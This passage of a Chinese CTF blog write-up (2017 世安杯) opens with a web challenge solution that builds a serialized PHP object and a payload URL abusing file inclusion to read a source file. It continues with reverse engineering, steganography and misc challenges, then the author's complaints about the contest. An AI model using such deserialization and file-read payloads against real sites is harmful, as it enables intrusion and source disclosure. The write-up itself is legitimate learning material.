<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>            <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="va">$this</span>-&gt;<span class="fu">file</span>)<span class="ot">;</span></span>
<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">&quot;__toString was called!&quot;</span><span class="ot">;</span></span>
<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span> <span class="op">=</span> <span class="kw">new</span> <span class="cn">R</span>ead()<span class="ot">;</span></span>
<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span>-&gt;<span class="fu">file</span> <span class="op">=</span> <span class="st">&quot;f1a9.php&quot;</span><span class="ot">;</span></span>
<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="fu">serialize</span>(<span class="va">$a</span>)<span class="ot">;</span></span>
<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
<p>得到<code>O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</code>
故最后payload为
<code>http://ctf1.shiyanbar.com/shian-du/?user=https://wzsite.cn/static/t.txt&amp;file=class.php&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</code></p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/22-50-20.jpg"></p>
<p><code>flag_Xd&#123;hSh_ctf:e@syt0g3t&#125;</code></p>
<h2 id="逆向">逆向</h2>
<h4 id="console">console</h4>
<p>丢查壳工具查看，发现是个.NET的程序，直接丢reflector反编译
发现关键源码</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">MAIN</span><span class="op">(</span>string<span class="op">[]</span> A_0<span class="op">)</span></span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>    string str2 <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>    DateTime now <span class="op">=</span> DateTime<span class="op">.</span><span class="fu">Now</span><span class="op">;</span></span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>    string str3 <span class="op">=</span> string<span class="op">.</span><span class="fu">Format</span><span class="op">(</span><span class="st">&quot;&#123;0&#125;&quot;</span><span class="op">,</span> now<span class="op">.</span><span class="fu">Hour</span> <span class="op">+</span> <span class="dv">1</span><span class="op">);</span></span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>    string str4 <span class="op">=</span> <span class="st">&quot;CreateByTenshine&quot;</span><span class="op">;</span></span>
<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>    <span class="fu">FUN1</span><span class="op">(</span>str4<span class="op">,</span> Convert<span class="op">.</span><span class="fu">ToInt32</span><span class="op">(</span>str3<span class="op">),</span> ref str2<span class="op">);</span></span>
<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span><span class="bu">Console</span><span class="op">.</span><span class="fu">ReadLine</span><span class="op">()</span> <span class="op">==</span> str2<span class="op">)</span></span>
<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Console</span><span class="op">.</span><span class="fu">WriteLine</span><span class="op">(</span><span class="st">&quot;u got it!&quot;</span><span class="op">);</span></span>
<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Console</span><span class="op">.</span><span class="fu">ReadKey</span><span class="op">(</span><span class="kw">true</span><span class="op">);</span></span>
<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span></span>
<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Console</span><span class="op">.</span><span class="fu">Write</span><span class="op">(</span><span class="st">&quot;wrong&quot;</span><span class="op">);</span></span>
<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Console</span><span class="op">.</span><span class="fu">ReadKey</span><span class="op">(</span><span class="kw">true</span><span class="op">);</span></span>
<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
<div class="sourceCode" id="cb23"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">FUN1</span><span class="op">(</span>string A_0<span class="op">,</span> <span class="dt">int</span> A_1<span class="op">,</span> ref string A_2<span class="op">)</span></span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> num <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span><span class="dv">0</span> <span class="op">&lt;</span> A_0<span class="op">.</span><span class="fu">Length</span><span class="op">)</span></span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">do</span></span>
<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">&#123;</span></span>
<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a>            <span class="dt">char</span> ch <span class="op">=</span> A_0<span class="op">[</span>num<span class="op">];</span></span>
<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>            <span class="dt">int</span> num2 <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a>            <span class="cf">do</span></span>
<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a>            <span class="op">&#123;</span></span>
<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a>                ch <span class="op">=</span> Convert<span class="op">.</span><span class="fu">ToChar</span><span class="op">(</span><span class="fu">FUN2</span><span class="op">(</span>Convert<span class="op">.</span><span class="fu">ToInt32</span><span class="op">(</span>ch<span class="op">),</span> num2<span class="op">));</span></span>
<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a>                num2<span class="op">++;</span></span>
<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a>            <span class="op">&#125;</span></span>
<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a>            <span class="cf">while</span> <span class="op">(</span>num2 <span class="op">&lt;</span> <span class="dv">15</span><span class="op">);</span></span>
<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a>            A_2 <span class="op">=</span> A_2 <span class="op">+</span> ch<span class="op">;</span></span>
<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a>            num<span class="op">++;</span></span>
<span id="cb23-18"><a href="#cb23-18" aria-hidden="true" tabindex="-1"></a>        <span class="op">&#125;</span></span>
<span id="cb23-19"><a href="#cb23-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="op">(</span>num <span class="op">&lt;</span> A_0<span class="op">.</span><span class="fu">Length</span><span class="op">);</span></span>
<span id="cb23-20"><a href="#cb23-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
<span id="cb23-21"><a href="#cb23-21" aria-hidden="true" tabindex="-1"></a>    A_2 <span class="op">=</span> <span class="fu">FUN2</span><span class="op">(</span>A_2<span class="op">);</span></span>
<span id="cb23-22"><a href="#cb23-22" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
<div class="sourceCode" id="cb24"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">int</span> <span class="fu">FUN2</span><span class="op">(</span><span class="dt">int</span> A_0<span class="op">,</span> <span class="dt">int</span> A_1<span class="op">)</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="op">(</span><span class="kw">new</span> <span class="dt">int</span><span class="op">[]</span> <span class="op">&#123;</span> </span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>        <span class="dv">2</span><span class="op">,</span> <span class="dv">3</span><span class="op">,</span> <span class="dv">5</span><span class="op">,</span> <span class="dv">7</span><span class="op">,</span> <span class="dv">11</span><span class="op">,</span> <span class="dv">13</span><span class="op">,</span> <span class="bn">0x11</span><span class="op">,</span> <span class="bn">0x13</span><span class="op">,</span> <span class="bn">0x17</span><span class="op">,</span> <span class="bn">0x1d</span><span class="op">,</span> <span class="bn">0x1f</span><span class="op">,</span> <span class="bn">0x25</span><span class="op">,</span> <span class="bn">0x29</span><span class="op">,</span> <span class="bn">0x2b</span><span class="op">,</span> <span class="bn">0x2f</span><span class="op">,</span> <span class="bn">0x35</span><span class="op">,</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>        <span class="bn">0x3b</span><span class="op">,</span> <span class="bn">0x3d</span><span class="op">,</span> <span class="bn">0x43</span><span class="op">,</span> <span class="bn">0x47</span><span class="op">,</span> <span class="bn">0x49</span><span class="op">,</span> <span class="bn">0x4f</span><span class="op">,</span> <span class="bn">0x53</span><span class="op">,</span> <span class="bn">0x59</span><span class="op">,</span> <span class="bn">0x61</span><span class="op">,</span> <span class="bn">0x65</span><span class="op">,</span> <span class="bn">0x67</span><span class="op">,</span> <span class="bn">0x6b</span><span class="op">,</span> <span class="bn">0x6d</span><span class="op">,</span> <span class="bn">0x71</span></span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;[</span>A_1<span class="op">]</span> <span class="op">^</span> A_0<span class="op">);</span></span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
<p>简单地写个python就可以逆向出来了</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span>  hashlib</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>l <span class="op">=</span> [ <span class="dv">2</span>, <span class="dv">3</span>, <span class="dv">5</span>, <span class="dv">7</span>, <span class="dv">11</span>, <span class="dv">13</span>, <span class="dv">17</span>, <span class="bn">0x13</span>, <span class="bn">0x17</span>, <span class="bn">0x1d</span>, <span class="bn">0x1f</span>, <span class="bn">0x25</span>, <span class="bn">0x29</span>, <span class="bn">0x2b</span>, <span class="bn">0x2f</span>, <span class="dv">53</span>, <span class="bn">0x3b</span>, <span class="bn">0x3d</span>, <span class="bn">0x43</span>, <span class="bn">0x47</span>, <span class="bn">0x49</span>, <span class="bn">0x4f</span>, <span class="bn">0x53</span>, <span class="bn">0x59</span>, <span class="bn">0x61</span>, <span class="bn">0x65</span>, <span class="bn">0x67</span>, <span class="bn">0x6b</span>, <span class="bn">0x6d</span>, <span class="dv">113</span>]</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="bu">str</span> <span class="op">=</span> <span class="st">&quot;CreateByTenshine&quot;</span></span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>re <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> j <span class="kw">in</span> <span class="bu">str</span>:</span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>    num <span class="op">=</span> <span class="bu">ord</span>(j)</span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1</span>,<span class="dv">15</span>):</span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a>        num <span class="op">=</span> l[i]<span class="op">^</span>num</span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a>    re<span class="op">+=</span> <span class="bu">chr</span>(num)</span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> re</span>
<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a>md5 <span class="op">=</span> hashlib.md5(re)</span>
<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> <span class="st">&quot;flag&#123;&quot;</span><span class="op">+</span>md5.hexdigest().upper()<span class="op">+</span><span class="st">&quot;&#125;&quot;</span></span></code></pre></div>
<p><code>flag&#123;967DDDFBCD32C1F53527C221D9E40A0B&#125;</code></p>
<blockquote>
<p>其他逆向是队友写的，还有的没做,逆向先更新到这</p>
</blockquote>
<h2 id="隐写">隐写</h2>
<h4 id="low">low</h4>
<p>提示就是low,那必定是LSB最低有效为位隐写了
直接用Stegsolve打开发现找不到
最后才发现是实验吧的原题，原来是Stegsolve处理bmp的缺陷，将图片另存为png之后再用Stegsolve打开找就能找到了</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/16-05-41.jpg"></p>
<p>然后发现手机扫描没反应 才意识到是反色了
把二维码截取下来，直接丢到任何可编辑的地方，比如QQ，word，然后直接鼠标拖动覆盖选择图片一下就直接反色了，然后就扫描就可以得到flag了</p>
<p><code>flag&#123;139711e8e9ed545e&#125;</code></p>
<h3 id="斑马斑马">斑马斑马</h3>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/19-09-50.jpg"></p>
<p>= =脑洞题，不想解释 斑马身上是个条形码，直接扫描就好了
在线扫描条形码网站:<a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>
<h3 id="createbywho">CreateByWho</h3>
<p>是一个零碎的二维码图片
之前百度杯也有类似的题，不过这个二维码是缺少了几部分的 <img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/19-13-37.jpg"> 没写出来
看别人的wp是把缺的三个角的方块自己补全然后扫描</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/19-15-03.jpg"></p>
<p>脑洞也是略大</p>
<h3 id="适合作为桌面的图片">适合作为桌面的图片</h3>
<p>很简单的隐写题
首先把图片用Stegsolve进行LSB隐写查找，找到如下二维码</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/19-23-06.jpg">
扫描之后得到一串十六进制数</p>
<pre><code>03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000
</code></pre>
<p>把所有的十六进制字符用winhex新建一个文件
发现文件末尾出现了1.py的字符</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/19-24-48.jpg"></p>
<p>目测是pyc逆向 丢到在线pyc逆向网站<a target="_blank" rel="noopener" href="http://tool.lu/pyc/">http://tool.lu/pyc/</a> 逆向得</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> flag():</span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">str</span> <span class="op">=</span> [<span class="dv">102</span>,<span class="dv">108</span>,<span class="dv">97</span>,<span class="dv">103</span>,<span class="dv">123</span>,<span class="dv">51</span>,<span class="dv">56</span>,<span class="dv">97</span>,<span class="dv">53</span>,<span class="dv">55</span>,<span class="dv">48</span>,<span class="dv">51</span>,<span class="dv">50</span>,<span class="dv">48</span>,<span class="dv">56</span>,<span class="dv">53</span>,<span class="dv">52</span>,<span class="dv">52</span>,<span class="dv">49</span>,<span class="dv">101</span>,<span class="dv">55</span>,<span class="dv">125</span>]</span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>    flag <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">str</span>:</span>
<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a>        flag <span class="op">+=</span> <span class="bu">chr</span>(i)</span>
<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span> flag</span></code></pre></div>
<p>运行一下即可获得flag <code>flag&#123;38a57032085441e7&#125;</code></p>
<h2 id="misc">Misc</h2>
<h4 id="reverseme">ReverseMe</h4>
<p>拿到文件发现打不开，用winhex查看发现是一个倒过来的图片文件</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/15-38-06.jpg"></p>
<p>直接用python逐个反过来就好了</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a>f <span class="op">=</span> <span class="bu">open</span>(<span class="vs">r&quot;C:\Users\windows8.Windows\Desktop\reverseMe\reverseMe&quot;</span>,<span class="st">&quot;rb&quot;</span>)</span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>f_1 <span class="op">=</span> <span class="bu">open</span>(<span class="vs">r&quot;C:\Users\windows8.Windows\Desktop\reverseMe_R&quot;</span>,<span class="st">&quot;wb&quot;</span>)</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>f_1.write(f.read()[::<span class="op">-</span><span class="dv">1</span>])</span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>f.close()</span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>f_1.close()</span></code></pre></div>
<p>然后用画图查看，发现是这个样子</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/15-48-59.jpg"></p>
<p>翻转一下就好了</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/15-49-13.jpg"></p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/15-49-20.jpg"></p>
<p><code>flag&#123;4f7548f93c7bef1dc6a0542cf04e796e&#125;</code></p>
<h3 id="珍妮的qq号">珍妮的qq号</h3>
<p>不解释</p>
<pre><code>珍妮换了一个新的QQ号码，原来的号码和新的号码都是5位靓号哦；其次，新的号码是原来号码的4倍，并且原来的号码倒着写正好是新的号码，请问，新号码是多少，新号码即为key。</code></pre>
<div class="sourceCode" id="cb30"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">xrange</span>(<span class="dv">1</span>,<span class="dv">99999</span>):</span>
<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="bu">str</span>(i).zfill(<span class="dv">5</span>)<span class="op">==</span> <span class="bu">str</span>(<span class="dv">4</span><span class="op">*</span>i).zfill(<span class="dv">5</span>)[::<span class="op">-</span><span class="dv">1</span>]:</span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span> <span class="dv">4</span><span class="op">*</span>i</span>
<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span></span></code></pre></div>
<p><code>87912</code></p>
<h3 id="webshell">webshell</h3>
<p>分析数据包的题
提示是<code>小黑在拿到webshell后，马上就获得了自己心仪公司的照片</code>
猜测就是找http包然后分析包含照片的信息
用wireshark打开包，过滤出http协议的包，不一会就能找到图片中的flag</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/15-59-10.jpg"><code>fl4g:&#123;ftop_Is_Waiting_4_y&#125;</code></p>
<h2 id="总结">总结</h2>
<p>先让我吐槽一下――<strong>辣鸡比赛</strong>
<strong>这是一个不尊重参赛者的比赛</strong>
连flag也不改，题目都是原题，选择题宕机最后半小时又开启说要算分(当时我直接无视了)，以及决赛还要自带干粮(这个不能忍！)
所以是果断地拒绝了参加决赛，纯当练手了</p>
<p><strong>感悟：</strong></p>
<blockquote>
<ul>
<li>少参加类似的技术含量低的比赛(除非实在闲得慌)</li>
<li>逆向要加强，汇编、动态调试、加花混淆、防动调等</li>
<li>多运动，做一天的题，累得慌</li>
</ul>
</blockquote>
<p><strong>感谢阅读</strong></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>T3stzer0</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.testzero-wz.com/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/">https://www.testzero-wz.com/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/CTF/"># CTF</a>
                    
                        <a href="/tag/WriteUp/"># WriteUp</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2017/10/16/%E7%94%A8C%E5%AE%9E%E7%8E%B0%E7%A3%81%E7%9B%98%E5%88%86%E6%9E%90/">用C实现磁盘分析</a>
            
            
            <a class="next" rel="next" href="/2017/09/29/%E6%BB%B4%E6%BB%B4%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E7%BB%8F/">滴滴实习生面经</a>
            
        </section>


    </article>
</div>

        </div>
        <!-- 
<footer id="footer" class="footer">
    <div class="copyright">
        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

-->
<script src="/js/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

    </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script> -->

<script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
</html>
